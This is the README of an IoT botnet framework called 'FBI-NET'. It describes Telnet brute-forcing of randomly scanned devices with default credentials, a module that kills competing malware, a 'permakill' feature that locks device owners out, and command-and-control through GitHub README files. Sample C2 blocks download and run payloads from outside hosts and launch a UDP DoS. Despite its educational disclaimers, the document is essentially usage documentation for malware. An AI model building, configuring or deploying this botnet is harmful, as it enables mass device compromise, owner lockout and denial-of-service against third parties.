* C2 over GitHub raw links (multiple fallback READMEs)
* Brute-force login over Telnet
* Killer module that removes other malware
* "Permakill" feature: changes device login credentials

⚠️ **DISCLAIMER:** This content is strictly for *educational and authorized penetration testing* in controlled lab environments. Misuse of such tools is **illegal**.

---

### 🧠 Project: `FBI-NET`

> A  IoT botnet framework controlled via multiple GitHub `README.md` files. Supports brute-force propagation, malware killing, and credential lockdown.

---
### Guide for .py files
you have to edit  the .py files and confiure them 
snotscan for finding devices
serialkiller for killing other nets 
permakill patches all devices with your own credentials save them securly
thefinalbop puts your payloads into the server
openssh.py is a bot for controlling devices using github Readme.md configure your links inside the code

### ✅ Features

* 📦 **Command & Control** via multiple GitHub `README.md` files
* 🔁 **Fallback Mechanism**: rotates through GitHub links until a working `### run` section is found
* 🕷️ **Brute-Forcing Engine**: cracks Telnet devices using default credentials
* ⚔️ **BotKiller Module**: terminates known malware processes and ports
* 🛡️ **Permakill Mode**: replaces Telnet credentials to block re-infection
* 🚀 **Async-Driven**: high-speed, concurrent scanning and infection

---

### 🗂️ GitHub `README.md` Format (C2)

Each C2 GitHub `README.md` must include a `### run` section:

```
### run
cmd echo Bot active on device
download http://malic.io/payload.sh /tmp/payload.sh RUN
dos 192.168.0.10 80 30
```

**Supported Commands:**

| Command     | Description                                |
| ----------- | ------------------------------------------ |
| `cmd`       | Executes shell commands                    |
| `download`  | Downloads and optionally runs files        |
| `dos`       | Performs a basic UDP DoS attack            |
| `permakill` | Changes device credentials to block access |
| `selfkill`  | Terminates self on the device              |

---

### 🧰 Default Credentials Format

Provide a text file like `creds.txt` with lines:

```
admin:admin
root:1234
user:password
```

---

### 📁 Files & Structure

```bash
bot.py               # Main infection and C2 logic
brute_force.py       # Telnet brute-forcing
killer.py            # Process killer module
permakill.py         # Changes credentials after install
github_c2.py         # C2 polling from multiple README.md links
creds.txt            # Default credential pairs
readmes.txt          # List of GitHub raw README.md C2 links
hits.txt             # Infected and confirmed targets
```

---

### 🚀 Execution Flow

1. Loads GitHub `README.md` URLs from `readmes.txt`
2. Finds the first with a `### run` section
3. Executes each command listed
4. If `brute` is enabled:

   * Scans random IPs
   * Brute-forces Telnet with `creds.txt`
   * On success, runs `bot.py` on target
5. Kills competing malware using `killer.py`
6. Replaces device credentials with `permakill.py` (if `permakill` enabled)

---

### 🧪 Sample C2 Behavior

```
### run
cmd uname -a
download http://your.c2.net/bin/armv7 /tmp/a RUN
permakill newuser:newpass
```

---

### 🛑 Legal Notice

> This project is intended **only** for:
>
> * Ethical hacking education
> * Red team exercises in controlled environments
> * Simulated botnet defense training

**Unauthorized use will violate criminal law.**
Always obtain explicit **written permission** before testing networks or devices.
